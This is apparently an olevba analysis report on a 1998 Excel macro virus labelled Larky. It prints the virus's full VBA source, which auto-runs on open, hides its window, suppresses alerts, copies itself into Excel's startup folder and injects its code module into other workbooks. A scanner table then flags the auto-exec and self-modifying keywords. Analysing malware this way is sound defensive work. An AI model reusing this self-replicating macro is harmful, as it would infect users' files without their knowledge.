olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Larky-8cfaf6dfb1c16dde8f7bcb5d3ccdfafab769e666
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Larky-8cfaf6dfb1c16dde8f7bcb5d3ccdfafab769e666 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Larky-8cfaf6dfb1c16dde8f7bcb5d3ccdfafab769e666 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Larky-8cfaf6dfb1c16dde8f7bcb5d3ccdfafab769e666 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Larky-8cfaf6dfb1c16dde8f7bcb5d3ccdfafab769e666 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO �.bas 
in file: Virus.MSExcel.Larky-8cfaf6dfb1c16dde8f7bcb5d3ccdfafab769e666 - OLE stream: '_VBA_PROJECT_CUR/VBA/\uf8f8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Larky
Private Sub Auto_Open()
On Error Resume Next
Application.EnableEvents = 1
Application.DisplayAlerts = 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
If Application.Workbooks("�").Name <> "�" Then
ι = Application.StartupPath & ".\" & "�"
Workbooks(ActiveWorkbook.Name).SaveCopyAs ι
Workbooks.Open ι: End If
Windows("�").Visible = 0: Application.OnSheetActivate = "�" & "!ν"
End Sub
Private Sub ν()
On Error Resume Next
Windows("�").Visible = 0
Set υ = ActiveWorkbook
Set α = ThisWorkbook.VBProject.VBComponents("�").CodeModule
λ = α.Lines(1, α.CountOfLines + 1)
If υ.VBProject.VBComponents(α).Name <> α Then
υ.VBProject.VBComponents.Add(1).Name = α
υ.VBProject.VBComponents(α).CodeModule.InsertLines 1, λ: End If
ThisWorkbook.Saved = 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

